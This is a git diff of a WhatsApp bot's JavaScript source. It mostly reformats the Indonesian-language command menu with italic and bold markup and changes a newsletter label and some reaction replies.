-│ ${setv} ${prefix}tagall
-│ ${setv} ${prefix}hidetag
-│ ${setv} ${prefix}totag (reply pesan)
-│ ${setv} ${prefix}listonline
-│ ${setv} ${prefix}group set
+╭─┴─┈➤「 *\`GROUP\`* 」❍  
+│ ${setv} ${prefix}_*add (62xxx)*_  
+│ ${setv} ${prefix}_*kick (@tag/62xxx)*_  
+│ ${setv} ${prefix}_*promote (@tag/62xxx)*_  
+│ ${setv} ${prefix}_*demote (@tag/62xxx)*_  
+│ ${setv} ${prefix}_*setname (nama baru gc)*_  
+│ ${setv} ${prefix}_*setdesc (desk)*_  
+│ ${setv} ${prefix}_*setppgc (reply imgnya)*_  
+│ ${setv} ${prefix}_*delete (reply pesan)*_  
+│ ${setv} ${prefix}_*linkgrup*_  
+│ ${setv} ${prefix}_*revoke*_  
+│ ${setv} ${prefix}_*tagall*_  
+│ ${setv} ${prefix}_*hidetag*_  
+│ ${setv} ${prefix}_*totag (reply pesan)*_  
+│ ${setv} ${prefix}_*listonline*_  
+│ ${setv} ${prefix}_*group set*_  
 ╰─┬────┈➤
-╭─┴─┈➤「 *\`SEARCH\`* 」❍
-│ ${setv} ${prefix}ytsearch (query)
-│ ${setv} ${prefix}pixiv (query)
-│ ${setv} ${prefix}pinterest (query)
-│ ${setv} ${prefix}wallpaper (query)
-│ ${setv} ${prefix}ringtone (query)
-│ ${setv} ${prefix}google (query)
-│ ${setv} ${prefix}gimage (query)
-│ ${setv} ${prefix}npm (query)
-│ ${setv} ${prefix}style (query)
-│ ${setv} ${prefix}ig (url akun ig)
-│ ${setv} ${prefix}searchgroup (nama_gc)
-│ ${setv} ${prefix}waktudunia
-│ ${setv} ${prefix}cuaca (kota)
-│ ${setv} ${prefix}animecari
-│ ${setv} ${prefix}mlnews
+╭─┴─┈➤「 *\`SEARCH\`* 」❍  
+│ ${setv} ${prefix}_*ytsearch (query)*_  
+│ ${setv} ${prefix}_*pixiv (query)*_  
+│ ${setv} ${prefix}_*pinterest (query)*_  
+│ ${setv} ${prefix}_*wallpaper (query)*_  
+│ ${setv} ${prefix}_*ringtone (query)*_  
+│ ${setv} ${prefix}_*google (query)*_  
+│ ${setv} ${prefix}_*gimage (query)*_  
+│ ${setv} ${prefix}_*npm (query)*_  
+│ ${setv} ${prefix}_*style (query)*_  
+│ ${setv} ${prefix}_*ig (url akun ig)*_  
+│ ${setv} ${prefix}_*searchgroup (nama_gc)*_  
+│ ${setv} ${prefix}_*waktudunia*_  
+│ ${setv} ${prefix}_*cuaca (kota)*_  
+│ ${setv} ${prefix}_*animecari*_  
+│ ${setv} ${prefix}_*mlnews*_  
 ╰─┬────┈➤
-╭─┴─┈➤「 *\`DOWNLOAD\`* 」❍
-│ ${setv} ${prefix}ytmp3 (url)
-│ ${setv} ${prefix}ytmp4 (url)
-│ ${setv} ${prefix}instagram (url)
-│ ${setv} ${prefix}tiktok (url)
-│ ${setv} ${prefix}facebook (url)
-│ ${setv} ${prefix}spotifydl (url)
-│ ${setv} ${prefix}mediafire (url)
+╭─┴─┈➤「 *\`DOWNLOAD\`* 」❍  
+│ ${setv} ${prefix}_*ytmp3 (url)*_  
+│ ${setv} ${prefix}_*ytmp4 (url)*_  
+│ ${setv} ${prefix}_*instagram (url)*_  
+│ ${setv} ${prefix}_*ttmp3 (url)*_  
+│ ${setv} ${prefix}_*ttmp4 (url)*_  
+│ ${setv} ${prefix}_*igstory (url)*_  
+│ ${setv} ${prefix}_*facebook (url)*_  
+│ ${setv} ${prefix}_*spotifydl (url)*_  
+│ ${setv} ${prefix}_*mediafire (url)*_  
 ╰─┬────┈➤
-╭─┴┈➤「 *\`PUSH\`* 」❍
-│ ${setv} ${prefix}pushkontak
-│ ${setv} ${prefix}pushkontak  
-│ ${setv} ${prefix}pushkontakid    
-│ ${setv} ${prefix}jpm
-│ ${setv} ${prefix}setteksjpm
-│ ${setv} ${prefix}teksjpm
-│ ${setv} ${prefix}svkontak (nama kontak)
-╰─┬──┈➤
-╭─┴─┈➤「 *\`QUOTES\`* 」❍
-│ ${setv} ${prefix}motivasi
-│ ${setv} ${prefix}quotes
-│ ${setv} ${prefix}quotesislamic
-│ ${setv} ${prefix}quotessad
-│ ${setv} ${prefix}truth
-│ ${setv} ${prefix}renungan
+╭─┴┈➤「 *\`PUSH\`* 」❍  
+│ ${setv} ${prefix}_*pushkontak*_  
+│ ${setv} ${prefix}_*pushkontak*_  
+│ ${setv} ${prefix}_*pushkontakid*_  
+│ ${setv} ${prefix}_*jpm*_  
+│ ${setv} ${prefix}_*setteksjpm*_  
+│ ${setv} ${prefix}_*teksjpm*_  
+│ ${setv} ${prefix}_*svkontak (nama kontak)*_  
+╰─┬──┈➤  
+╭─┴─┈➤「 *\`QUOTES\`* 」❍  
+│ ${setv} ${prefix}_*motivasi*_  
+│ ${setv} ${prefix}_*quotes*_  
+│ ${setv} ${prefix}_*quotesislamic*_  
+│ ${setv} ${prefix}_*quotessad*_  
+│ ${setv} ${prefix}_*truth*_  
+│ ${setv} ${prefix}_*renungan*_  
 ╰─┬────┈➤
 ╭─┴┈➤「 *LIBRAY MENU* 」❍    
-│ ${setv} ${prefix}cerpen-anak  
-│ ${setv} ${prefix}cerpen-bahasadaerah  
-│ ${setv} ${prefix}cerpen-bahasainggris  
-│ ${setv} ${prefix}cerpen-bahasajawa  
-│ ${setv} ${prefix}cerpen-bahasasunda  
-│ ${setv} ${prefix}cerpen-budaya  
-│ ${setv} ${prefix}cerpen-cinta  
-│ ${setv} ${prefix}cerpen-cintaislami  
-│ ${setv} ${prefix}cerpen-cintapertama  
-│ ${setv} ${prefix}cerpen-cintaromantis  
-│ ${setv} ${prefix}cerpen-cintasedih  
-│ ${setv} ${prefix}cerpen-cintasegitiga  
-│ ${setv} ${prefix}cerpen-cintasejati  
-│ ${setv} ${prefix}cerpen-galau  
-│ ${setv} ${prefix}cerpen-gokil  
-│ ${setv} ${prefix}cerpen-inspiratif  
-│ ${setv} ${prefix}cerpen-jepang  
-│ ${setv} ${prefix}cerpen-kehidupan  
-│ ${setv} ${prefix}cerpen-keluarga  
-│ ${setv} ${prefix}cerpen-kisahnyata  
-│ ${setv} ${prefix}cerpen-korea  
-│ ${setv} ${prefix}cerpen-kristen  
-│ ${setv} ${prefix}cerpen-liburan  
-│ ${setv} ${prefix}cerpen-malaysia  
-│ ${setv} ${prefix}cerpen-mengharukan  
-│ ${setv} ${prefix}cerpen-misteri  
-│ ${setv} ${prefix}cerpen-motivasi  
-│ ${setv} ${prefix}cerpen-nasihat  
-│ ${setv} ${prefix}cerpen-nasionalisme  
-│ ${setv} ${prefix}cerpen-olahraga  
-│ ${setv} ${prefix}cerpen-patahhati  
-│ ${setv} ${prefix}cerpen-penantian  
-│ ${setv} ${prefix}cerpen-pendidikan  
-│ ${setv} ${prefix}cerpen-pengalaman  
-│ ${setv} ${prefix}cerpen-pengorbanan  
-│ ${setv} ${prefix}cerpen-penyesalan  
-│ ${setv} ${prefix}cerpen-perjuangan  
-│ ${setv} ${prefix}cerpen-perpisahan  
-│ ${setv} ${prefix}cerpen-persahabatan  
-│ ${setv} ${prefix}cerpen-petualangan  
-│ ${setv} ${prefix}cerpen-ramadhan  
-│ ${setv} ${prefix}cerpen-remaja  
-│ ${setv} ${prefix}cerpen-rindu  
-│ ${setv} ${prefix}cerpen-rohani  
-│ ${setv} ${prefix}cerpen-romantis  
-│ ${setv} ${prefix}cerpen-sastra  
-│ ${setv} ${prefix}cerpen-sedih  
-│ ${setv} ${prefix}cerpen-sejarah  
+│ ${setv} ${prefix}_*cerpen-anak*_  
+│ ${setv} ${prefix}_*cerpen-bahasadaerah*_  
+│ ${setv} ${prefix}_*cerpen-bahasainggris*_  
+│ ${setv} ${prefix}_*cerpen-bahasajawa*_  
+│ ${setv} ${prefix}_*cerpen-bahasasunda*_  
+│ ${setv} ${prefix}_*cerpen-budaya*_  
+│ ${setv} ${prefix}_*cerpen-cinta*_  
+│ ${setv} ${prefix}_*cerpen-cintaislami*_  
+│ ${setv} ${prefix}_*cerpen-cintapertama*_  
+│ ${setv} ${prefix}_*cerpen-cintaromantis*_  
+│ ${setv} ${prefix}_*cerpen-cintasedih*_  
+│ ${setv} ${prefix}_*cerpen-cintasegitiga*_  
+│ ${setv} ${prefix}_*cerpen-cintasejati*_  
+│ ${setv} ${prefix}_*cerpen-galau*_  
+│ ${setv} ${prefix}_*cerpen-gokil*_  
+│ ${setv} ${prefix}_*cerpen-inspiratif*_  
+│ ${setv} ${prefix}_*cerpen-jepang*_  
+│ ${setv} ${prefix}_*cerpen-kehidupan*_  
+│ ${setv} ${prefix}_*cerpen-keluarga*_  
+│ ${setv} ${prefix}_*cerpen-kisahnyata*_  
+│ ${setv} ${prefix}_*cerpen-korea*_  
+│ ${setv} ${prefix}_*cerpen-kristen*_  
+│ ${setv} ${prefix}_*cerpen-liburan*_  
+│ ${setv} ${prefix}_*cerpen-malaysia*_  
+│ ${setv} ${prefix}_*cerpen-mengharukan*_  
+│ ${setv} ${prefix}_*cerpen-misteri*_  
+│ ${setv} ${prefix}_*cerpen-motivasi*_  
+│ ${setv} ${prefix}_*cerpen-nasihat*_  
+│ ${setv} ${prefix}_*cerpen-nasionalisme*_  
+│ ${setv} ${prefix}_*cerpen-olahraga*_  
+│ ${setv} ${prefix}_*cerpen-patahhati*_  
+│ ${setv} ${prefix}_*cerpen-penantian*_  
+│ ${setv} ${prefix}_*cerpen-pendidikan*_  
+│ ${setv} ${prefix}_*cerpen-pengalaman*_  
+│ ${setv} ${prefix}_*cerpen-pengorbanan*_  
+│ ${setv} ${prefix}_*cerpen-penyesalan*_  
+│ ${setv} ${prefix}_*cerpen-perjuangan*_  
+│ ${setv} ${prefix}_*cerpen-perpisahan*_  
+│ ${setv} ${prefix}_*cerpen-persahabatan*_  
+│ ${setv} ${prefix}_*cerpen-petualangan*_  
+│ ${setv} ${prefix}_*cerpen-ramadhan*_  
+│ ${setv} ${prefix}_*cerpen-remaja*_  
+│ ${setv} ${prefix}_*cerpen-rindu*_  
+│ ${setv} ${prefix}_*cerpen-rohani*_  
+│ ${setv} ${prefix}_*cerpen-romantis*_  
+│ ${setv} ${prefix}_*cerpen-sastra*_  
+│ ${setv} ${prefix}_*cerpen-sedih*_  
+│ ${setv} ${prefix}_*cerpen-sejarah*_  
 ╰─┬───┈➤
-╭─┴─┈➤「 *\`TOOLS\`* 」❍
-│ ${setv} ${prefix}get (url)
-│ ${setv} ${prefix}hd (reply pesan)
-│ ${setv} ${prefix}toaudio (reply pesan)
-│ ${setv} ${prefix}tomp3 (reply pesan)
-│ ${setv} ${prefix}tovn (reply pesan)
-│ ${setv} ${prefix}toimage (reply pesan)
-│ ${setv} ${prefix}toptv (reply pesan)
-│ ${setv} ${prefix}tourl (reply pesan)
-│ ${setv} ${prefix}tts (textnya)
-│ ${setv} ${prefix}toqr (textnya)
-│ ${setv} ${prefix}ssweb (url)
-│ ${setv} ${prefix}enc
-│ ${setv} ${prefix}githubtrend 
-│ ${setv} ${prefix}breatanime (teks)
-│ ${setv} ${prefix}brat (teks)
-│ ${setv} ${prefix}bratvid (teks)
-│ ${setv} ${prefix}sticker (send/reply img)
-│ ${setv} ${prefix}colong (reply stiker)
-│ ${setv} ${prefix}smeme (send/reply img)
-│ ${setv} ${prefix}emojimix 🙃+💀
-│ ${setv} ${prefix}nulis
-│ ${setv} ${prefix}readmore text1|text2
-│ ${setv} ${prefix}qc (pesannya)
-│ ${setv} ${prefix}translate
-│ ${setv} ${prefix}wasted (send/reply img)
-│ ${setv} ${prefix}triggered (send/reply img)
-│ ${setv} ${prefix}shorturl (urlnya)
-│ ${setv} ${prefix}gitclone (urlnya)
-│ ${setv} ${prefix}fat (reply audio)
-│ ${setv} ${prefix}fast (reply audio)
-│ ${setv} ${prefix}bass (reply audio)
-│ ${setv} ${prefix}slow (reply audio)
-│ ${setv} ${prefix}tupai (reply audio)
-│ ${setv} ${prefix}deep (reply audio)
-│ ${setv} ${prefix}robot (reply audio)
-│ ${setv} ${prefix}blown (reply audio)
-│ ${setv} ${prefix}reverse (reply audio)
-│ ${setv} ${prefix}smooth (reply audio)
-│ ${setv} ${prefix}earrape (reply audio)
-│ ${setv} ${prefix}nightcore (reply audio)
-│ ${setv} ${prefix}getexif (reply sticker)
+╭─┴─┈➤「 *\`TOOLS\`* 」❍  
+│ ${setv} ${prefix}_*get (url)*_  
+│ ${setv} ${prefix}_*hd (reply pesan)*_  
+│ ${setv} ${prefix}_*toaudio (reply pesan)*_  
+│ ${setv} ${prefix}_*tomp3 (reply pesan)*_  
+│ ${setv} ${prefix}_*tovn (reply pesan)*_  
+│ ${setv} ${prefix}_*toimage (reply pesan)*_  
+│ ${setv} ${prefix}_*toptv (reply pesan)*_  
+│ ${setv} ${prefix}_*tourl (reply pesan)*_  
+│ ${setv} ${prefix}_*tts (textnya)*_  
+│ ${setv} ${prefix}_*toqr (textnya)*_  
+│ ${setv} ${prefix}_*ssweb (url)*_  
+│ ${setv} ${prefix}_*enc*_  
+│ ${setv} ${prefix}_*githubtrend*_  
+│ ${setv} ${prefix}_*breatanime (teks)*_  
+│ ${setv} ${prefix}_*brat (teks)*_  
+│ ${setv} ${prefix}_*bratvid (teks)*_  
+│ ${setv} ${prefix}_*sticker (send/reply img)*_  
+│ ${setv} ${prefix}_*colong (reply stiker)*_  
+│ ${setv} ${prefix}_*smeme (send/reply img)*_  
+│ ${setv} ${prefix}_*emojimix 🙃+💀*_  
+│ ${setv} ${prefix}_*nulis*_  
+│ ${setv} ${prefix}_*readmore text1|text2*_  
+│ ${setv} ${prefix}_*qc (pesannya)*_  
+│ ${setv} ${prefix}_*translate*_  
+│ ${setv} ${prefix}_*wasted (send/reply img)*_  
+│ ${setv} ${prefix}_*triggered (send/reply img)*_  
+│ ${setv} ${prefix}_*shorturl (urlnya)*_  
+│ ${setv} ${prefix}_*gitclone (urlnya)*_  
+│ ${setv} ${prefix}_*fat (reply audio)*_  
+│ ${setv} ${prefix}_*fast (reply audio)*_  
+│ ${setv} ${prefix}_*bass (reply audio)*_  
+│ ${setv} ${prefix}_*slow (reply audio)*_  
+│ ${setv} ${prefix}_*tupai (reply audio)*_  
+│ ${setv} ${prefix}_*deep (reply audio)*_  
+│ ${setv} ${prefix}_*robot (reply audio)*_  
+│ ${setv} ${prefix}_*blown (reply audio)*_  
+│ ${setv} ${prefix}_*reverse (reply audio)*_  
+│ ${setv} ${prefix}_*smooth (reply audio)*_  
+│ ${setv} ${prefix}_*earrape (reply audio)*_  
+│ ${setv} ${prefix}_*nightcore (reply audio)*_  
+│ ${setv} ${prefix}_*getexif (reply sticker)*_  
 ╰─┬────┈➤
-╭─┴─┈➤「 *\`AI\`* 」❍
-│ ${setv} ${prefix}ai (query)
-│ ${setv} ${prefix}simi (query)
-│ ${setv} ${prefix}txt2img (query)
+╭─┴─┈➤「 *\`AI\`* 」❍  
+│ ${setv} ${prefix}_*ai (query)*_  
+│ ${setv} ${prefix}_*simi (query)*_  
+│ ${setv} ${prefix}_*txt2img (query)*_  
+╰─┬────┈➤  
+╭─┴─┈➤「 *\`ANIME\`* 」❍  
+│ ${setv} ${prefix}_*waifu*_
+│ ${setv} ${prefix}_*neko*_
+│ ${setv} ${prefix}_*akira*_
+│ ${setv} ${prefix}_*akiyama*_
+│ ${setv} ${prefix}_*ana*_
+│ ${setv} ${prefix}_*art*_
+│ ${setv} ${prefix}_*asuna*_
+│ ${setv} ${prefix}_*ayuzawa*_
+│ ${setv} ${prefix}_*boruto*_
+│ ${setv} ${prefix}_*bts*_
+│ ${setv} ${prefix}_*chino*_
+│ ${setv} ${prefix}_*chitoge*_
+│ ${setv} ${prefix}_*cosplay*_
+│ ${setv} ${prefix}_*cosplayloli*_
+│ ${setv} ${prefix}_*cosplaysagiri*_
+│ ${setv} ${prefix}_*cyber*_
+│ ${setv} ${prefix}_*deidara*_
+│ ${setv} ${prefix}_*doraemon*_
+│ ${setv} ${prefix}_*elaina*_
+│ ${setv} ${prefix}_*emilia*_
+│ ${setv} ${prefix}_*erza*_
+│ ${setv} ${prefix}_*exo*_
+│ ${setv} ${prefix}_*gamewalpaper*_
+│ ${setv} ${prefix}_*gremoy*_
+│ ${setv} ${prefix}_*hacker*_
+│ ${setv} ${prefix}_*hestia*_
+│ ${setv} ${prefix}_*hinata*_
+│ ${setv} ${prefix}_*husbu*_
+│ ${setv} ${prefix}_*inori*_
+│ ${setv} ${prefix}_*islamic*_
+│ ${setv} ${prefix}_*isuzu*_
+│ ${setv} ${prefix}_*itachi*_
+│ ${setv} ${prefix}_*itori*_
+│ ${setv} ${prefix}_*jennie*_
+│ ${setv} ${prefix}_*jiso*_
+│ ${setv} ${prefix}_*justina*_
+│ ${setv} ${prefix}_*kaga*_
+│ ${setv} ${prefix}_*kagura*_
+│ ${setv} ${prefix}_*kakasih*_
+│ ${setv} ${prefix}_*kaori*_
+│ ${setv} ${prefix}_*cartoon*_
+│ ${setv} ${prefix}_*shortquete*_
+│ ${setv} ${prefix}_*kaneki*_
+│ ${setv} ${prefix}_*kotori*_
+│ ${setv} ${prefix}_*kurumi*_
+│ ${setv} ${prefix}_*lisa*_
+│ ${setv} ${prefix}_*madara*_
+│ ${setv} ${prefix}_*megumin*_
+│ ${setv} ${prefix}_*mikasa*_
+│ ${setv} ${prefix}_*mikey*_
+│ ${setv} ${prefix}_*miku*_
+│ ${setv} ${prefix}_*minato*_
+│ ${setv} ${prefix}_*mountain*_
+│ ${setv} ${prefix}_*naruto*_
+│ ${setv} ${prefix}_*neko2*_
+│ ${setv} ${prefix}_*nekoanime*_
+│ ${setv} ${prefix}_*nezuko*_
 ╰─┬────┈➤
-╭─┴─┈➤「 *\`ANIME\`* 」❍
-│ ${setv} ${prefix}waifu  
-│ ${setv} ${prefix}neko    
-│ ${setv} ${prefix}akira  
-│ ${setv} ${prefix}akiyama  
-│ ${setv} ${prefix}ana  
-│ ${setv} ${prefix}art  
-│ ${setv} ${prefix}asuna  
-│ ${setv} ${prefix}ayuzawa  
-│ ${setv} ${prefix}boruto  
-│ ${setv} ${prefix}bts  
-│ ${setv} ${prefix}chino  
-│ ${setv} ${prefix}chitoge  
-│ ${setv} ${prefix}cosplay  
-│ ${setv} ${prefix}cosplayloli  
-│ ${setv} ${prefix}cosplaysagiri  
-│ ${setv} ${prefix}cyber  
-│ ${setv} ${prefix}deidara  
-│ ${setv} ${prefix}doraemon  
-│ ${setv} ${prefix}elaina  
-│ ${setv} ${prefix}emilia  
-│ ${setv} ${prefix}erza  
-│ ${setv} ${prefix}exo  
-│ ${setv} ${prefix}gamewalpaper  
-│ ${setv} ${prefix}gremoy  
-│ ${setv} ${prefix}hacker  
-│ ${setv} ${prefix}hestia  
-│ ${setv} ${prefix}hinata  
-│ ${setv} ${prefix}husbu  
-│ ${setv} ${prefix}inori  
-│ ${setv} ${prefix}islamic  
-│ ${setv} ${prefix}isuzu  
-│ ${setv} ${prefix}itachi  
-│ ${setv} ${prefix}itori  
-│ ${setv} ${prefix}jennie  
-│ ${setv} ${prefix}jiso  
-│ ${setv} ${prefix}justina  
-│ ${setv} ${prefix}kaga  
-│ ${setv} ${prefix}kagura  
-│ ${setv} ${prefix}kakasih  
-│ ${setv} ${prefix}kaori  
-│ ${setv} ${prefix}cartoon  
-│ ${setv} ${prefix}shortquete  
-│ ${setv} ${prefix}kaneki  
-│ ${setv} ${prefix}kotori  
-│ ${setv} ${prefix}kurumi  
-│ ${setv} ${prefix}lisa  
-│ ${setv} ${prefix}madara  
-│ ${setv} ${prefix}megumin  
-│ ${setv} ${prefix}mikasa  
-│ ${setv} ${prefix}mikey  
-│ ${setv} ${prefix}miku  
-│ ${setv} ${prefix}minato  
-│ ${setv} ${prefix}mountain  
-│ ${setv} ${prefix}naruto  
-│ ${setv} ${prefix}neko2  
-│ ${setv} ${prefix}nekoanime  
-│ ${setv} ${prefix}nezuko  
-│ ${setv} ${prefix}onepiece  
-│ ${setv} ${prefix}pentol  
-│ ${setv} ${prefix}pokemon  
-│ ${setv} ${prefix}progaming  
-│ ${setv} ${prefix}randomanime  
-│ ${setv} ${prefix}randomanime2  
-│ ${setv} ${prefix}rize  
-│ ${setv} ${prefix}rose  
-│ ${setv} ${prefix}sagiri  
-│ ${setv} ${prefix}sakura  
-│ ${setv} ${prefix}sasuke  
-│ ${setv} ${prefix}satanic  
-│ ${setv} ${prefix}shina  
-│ ${setv} ${prefix}shinka  
-│ ${setv} ${prefix}shinomiya  
-│ ${setv} ${prefix}ahizuka  
-│ ${setv} ${prefix}shota  
-│ ${setv} ${prefix}space  
-│ ${setv} ${prefix}tejina  
-│ ${setv} ${prefix}tecnology  
-│ ${setv} ${prefix}toukachan  
-│ ${setv} ${prefix}sunade  
-│ ${setv} ${prefix}yotsuba  
-│ ${setv} ${prefix}yuki  
-│ ${setv} ${prefix}yulibocil  
-│ ${setv} ${prefix}yumekk  
+╭─┴─┈➤「 *\`MUSIC\`* 」❍  
+│ ${setv} ${prefix}_*music1*_
+│ ${setv} ${prefix}_*music2*_
+│ ${setv} ${prefix}_*music3*_
+│ ${setv} ${prefix}_*music4*_
+│ ${setv} ${prefix}_*music5*_
+│ ${setv} ${prefix}_*music6*_
+│ ${setv} ${prefix}_*music7*_
+│ ${setv} ${prefix}_*music8*_
+│ ${setv} ${prefix}_*music9*_
+│ ${setv} ${prefix}_*music10*_
+│ ${setv} ${prefix}_*playmusic (list menumusicnya)*_
+╰─┬───┈➤  
+╭─┴─┈➤「 *\`GAME\`* 」❍  
+│ ${setv} ${prefix}_*tictactoe*_
+│ ${setv} ${prefix}_*akinator*_
+│ ${setv} ${prefix}_*suit*_
+│ ${setv} ${prefix}_*slot*_
+│ ${setv} ${prefix}_*math (level)*_
+│ ${setv} ${prefix}_*begal*_
+│ ${setv} ${prefix}_*casino (nominal)*_
+│ ${setv} ${prefix}_*rampok (@tag)*_
+│ ${setv} ${prefix}_*tekateki*_
+│ ${setv} ${prefix}_*tebaklirik*_
+│ ${setv} ${prefix}_*tebakkata*_
+│ ${setv} ${prefix}_*tebakbom*_
+│ ${setv} ${prefix}_*susunkata*_
+│ ${setv} ${prefix}_*tebakkimia*_
+│ ${setv} ${prefix}_*caklontong*_
+│ ${setv} ${prefix}_*tebaknegara*_
+│ ${setv} ${prefix}_*tebakgambar*_
+│ ${setv} ${prefix}_*tebakbendera*_
 ╰─┬────┈➤
-╭─┴─┈➤「 *\`MUSIC\`* 」❍ 
-│ ${setv} ${prefix}music1
-│ ${setv} ${prefix}music2
-│ ${setv} ${prefix}music3
-│ ${setv} ${prefix}music4
-│ ${setv} ${prefix}music5
-│ ${setv} ${prefix}music6
-│ ${setv} ${prefix}music7
-│ ${setv} ${prefix}music8
-│ ${setv} ${prefix}music9
-│ ${setv} ${prefix}music10
-│ ${setv} ${prefix}playmusic (list menumusicnya)
-╰─┬───┈➤
-╭─┴─┈➤「 *\`GAME\`* 」❍
-│ ${setv} ${prefix}tictactoe
-│ ${setv} ${prefix}akinator
-│ ${setv} ${prefix}suit
-│ ${setv} ${prefix}slot
-│ ${setv} ${prefix}math (level)
-│ ${setv} ${prefix}begal
-│ ${setv} ${prefix}casino (nominal)
-│ ${setv} ${prefix}rampok (@tag)
-│ ${setv} ${prefix}tekateki
-│ ${setv} ${prefix}tebaklirik
-│ ${setv} ${prefix}tebakkata
-│ ${setv} ${prefix}tebakbom
-│ ${setv} ${prefix}susunkata 
-│ ${setv} ${prefix}tebakkimia
-│ ${setv} ${prefix}caklontong
-│ ${setv} ${prefix}tebaknegara
-│ ${setv} ${prefix}tebakgambar
-│ ${setv} ${prefix}tebakbendera
-╰─┬────┈➤
-╭─┴─┈➤「 *\`FUN\`* 」❍
-│ ${setv} ${prefix}dadu
-│ ${setv} ${prefix}bisakah (text)
-│ ${setv} ${prefix}apakah (text)
-│ ${setv} ${prefix}kapan (text)
-│ ${setv} ${prefix}kerangajaib (text)
-│ ${setv} ${prefix}cekmati (nama lu)
-│ ${setv} ${prefix}ceksifat
-│ ${setv} ${prefix}cekkhodam (nama lu)
-│ ${setv} ${prefix}rate (reply pesan)
-│ ${setv} ${prefix}jodohku
-│ ${setv} ${prefix}jadian
-│ ${setv} ${prefix}fitnah
-│ ${setv} ${prefix}halah (text)
-│ ${setv} ${prefix}hilih (text)
-│ ${setv} ${prefix}huluh (text)
-│ ${setv} ${prefix}heleh (text)
-│ ${setv} ${prefix}holoh (text)
-╰─┬────┈➤
+╭─┴─┈➤「 *\`FUN\`* 」❍  
+│ ${setv} ${prefix}_*dadu*_
+│ ${setv} ${prefix}_*bisakah (text)*_
+│ ${setv} ${prefix}_*apakah (text)*_
+│ ${setv} ${prefix}_*kapan (text)*_
+│ ${setv} ${prefix}_*kerangajaib (text)*_
+│ ${setv} ${prefix}_*cekmati (nama lu)*_
+│ ${setv} ${prefix}_*ceksifat*_
+│ ${setv} ${prefix}_*cekkhodam (nama lu)*_
+│ ${setv} ${prefix}_*rate (reply pesan)*_
+│ ${setv} ${prefix}_*jodohku*_
+│ ${setv} ${prefix}_*jadian*_
+│ ${setv} ${prefix}_*fitnah*_
+│ ${setv} ${prefix}_*halah (text)*_
+│ ${setv} ${prefix}_*hilih (text)*_
+│ ${setv} ${prefix}_*huluh (text)*_
+│ ${setv} ${prefix}_*heleh (text)*_
+│ ${setv} ${prefix}_*holoh (text)*_
+╰─┬────┈➤  
 ╭─┴─┈➤「 *\`RANDOM\`* 」❍  
-│ ${setv} ${prefix}coffe  
-│ ${setv} ${prefix}cogan  
-│ ${setv} ${prefix}cecan  
-│ ${setv} ${prefix}jepang  
-│ ${setv} ${prefix}korea  
-│ ${setv} ${prefix}mobil  
-│ ${setv} ${prefix}cina  
-│ ${setv} ${prefix}vietnam  
-╰ ─┬────┈➤
- ─┬┴─┈➤「 XlesyBug 」❍    
-╭ ┴─┈➤「 *\`OWNER\`* 」❍
-│ ${setv} ${prefix}bot [set]
-│ ${setv} ${prefix}done
-│ ${setv} ${prefix}setbio
-│ ${setv} ${prefix}setppbot
-│ ${setv} ${prefix}join
-│ ${setv} ${prefix}leave
-│ ${setv} ${prefix}leaveid
-│ ${setv} ${prefix}block
-│ ${setv} ${prefix}listblock
-│ ${setv} ${prefix}openblock
-│ ${setv} ${prefix}listpc
-│ ${setv} ${prefix}listgcbot
-│ ${setv} ${prefix}listgc
-│ ${setv} ${prefix}replay (pesannya)
-│ ${setv} ${prefix}replay1 (pesannya)
-│ ${setv} ${prefix}notif
-│ ${setv} ${prefix}creategc
-│ ${setv} ${prefix}addprem
-│ ${setv} ${prefix}delprem
-│ ${setv} ${prefix}listprem
-│ ${setv} ${prefix}addlimit
-│ ${setv} ${prefix}adduang
-│ ${setv} ${prefix}bot --settings
-│ ${setv} ${prefix}bot settings
-│ ${setv} ${prefix}restartbot 
-│ ${setv} ${prefix}getsession
-│ ${setv} ${prefix}delsession
-│ ${setv} ${prefix}delsampah
-│ ${setv} ${prefix}upsw
-╰─────┈➤`
+│ ${setv} ${prefix}_*coffe*_
+│ ${setv} ${prefix}_*cogan*_
+│ ${setv} ${prefix}_*cecan*_
+│ ${setv} ${prefix}_*jepang*_
+│ ${setv} ${prefix}_*korea*_
+│ ${setv} ${prefix}_*mobil*_
+│ ${setv} ${prefix}_*cina*_
+│ ${setv} ${prefix}_*vietnam*_
+╰─┬────┈➤  
+╭─┴─┈➤「 *\`OWNER\`* 」❍  
+│ ${setv} ${prefix}_*bot [set]*_
+│ ${setv} ${prefix}_*done*_
+│ ${setv} ${prefix}_*setbio*_
+│ ${setv} ${prefix}_*setppbot*_
+│ ${setv} ${prefix}_*join*_
+│ ${setv} ${prefix}_*leave*_
+│ ${setv} ${prefix}_*leaveid*_
+│ ${setv} ${prefix}_*block*_
+│ ${setv} ${prefix}_*listblock*_
+│ ${setv} ${prefix}_*openblock*_
+│ ${setv} ${prefix}_*listpc*_
+│ ${setv} ${prefix}_*listgcbot*_
+│ ${setv} ${prefix}_*listgc*_
+│ ${setv} ${prefix}_*replay (pesannya)*_
+│ ${setv} ${prefix}_*replay1 (pesannya)*_
+│ ${setv} ${prefix}_*notif*_
+│ ${setv} ${prefix}_*creategc*_
+│ ${setv} ${prefix}_*addprem*_
+│ ${setv} ${prefix}_*delprem*_
+│ ${setv} ${prefix}_*listprem*_
+│ ${setv} ${prefix}_*addlimit*_
+│ ${setv} ${prefix}_*adduang*_
+│ ${setv} ${prefix}_*bot --settings*_
+│ ${setv} ${prefix}_*bot settings*_
+│ ${setv} ${prefix}_*restartbot*_
+│ ${setv} ${prefix}_*getsession*_
+│ ${setv} ${prefix}_*delsession*_
+│ ${setv} ${prefix}_*delsampah*_
+│ ${setv} ${prefix}_*upsw*_
+╰─────┈➤
+> XLESYVIP`
 				await m.reply({
 					document: fake.docs,
 					fileName: ucapanWaktu,
@@ -9848,7 +9832,7 @@ break;
 						forwardedNewsletterMessageInfo: {
 							newsletterJid: my.ch,
 							serverMessageId: null,
-							newsletterName: 'GxyennDev Info Update'
+							newsletterName: 'new info update XLESYVIP'
 						},
 						externalAdReply: {
 							title: author,
@@ -9866,12 +9850,7 @@ break;
 			break
             //MENU-MENU
             case 'botmenu': {
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '⏳',
-                        key: m.key
-                    }
-                })
+                Replyx(mess.wait)
                 let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal
 
                 let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍ 
@@ -9923,25 +9902,15 @@ break;
                 }, {
                     quoted: ftroli
                 })
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '✅',
-                        key: m.key
-                    }
-                })
+                
             }
             break
 
             case 'groupmenu': {
